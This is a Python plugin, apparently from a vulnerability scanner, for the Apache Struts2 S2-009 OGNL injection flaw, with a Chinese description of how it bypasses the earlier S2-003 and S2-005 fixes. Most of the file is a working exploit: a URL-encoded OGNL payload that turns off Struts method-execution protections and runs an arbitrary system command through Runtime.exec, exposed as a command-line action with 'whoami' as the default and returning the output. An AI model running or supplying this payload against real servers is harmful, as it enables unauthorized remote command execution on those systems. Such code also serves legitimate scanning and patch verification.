# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "struts-s2-009 代码执行漏洞",
        "description": "这个漏洞跟s2-003 s2-005 属于一套的。 Struts2对s2-003的修复方法是禁止#号，于是s2-005通过使用编码\u0023或\43来绕过；于是Struts2对s2-005的修复方法是禁止\等特殊符号，使用户不能提交反斜线。 但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用/HelloWorld.acton?example=&(example)('xxx')=1的方法来执行它，从而绕过官方对#、\等特殊字符的防御。",
        "references": ["-"],
    }

    def url(self) -> dict:
        random_str = self.build_random_str(7)
        res = self.exec_cmd(self.target.value, f'echo {random_str}')
        if res and random_str in res:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.url}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        r = self.request(
            method='GET',
            url=urllib.parse.urljoin(url, f'./ajax/example5.action??age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27{cmd}%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]'),
            timeout=15,
        )
        if r.status_code == 200:
            return r.text
